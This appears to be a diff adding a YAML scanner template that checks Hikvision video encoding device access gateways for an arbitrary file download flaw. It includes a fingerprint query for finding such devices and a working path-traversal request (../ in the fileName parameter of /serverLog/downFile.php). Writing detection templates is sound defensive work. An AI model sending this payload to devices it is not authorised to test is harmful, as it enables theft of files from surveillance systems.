@@ -1,0 +1,21 @@
+name: HIKVISION 视频编码设备接入网关 任意文件下载
+manual: true
+query: (app="Hikvision-Video-coding-device-access-gateway" || title="视频编码设备接入网关")
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"$file_name=")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: |-
+    海康威视视频接入网关系统在页面/serverLog/downFile.php的参数fileName存在任意文件下载漏洞
+
+    访问 http://xxx.xxx.xxx.xxx/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php 下载文件
+  tags: 任意文件下载
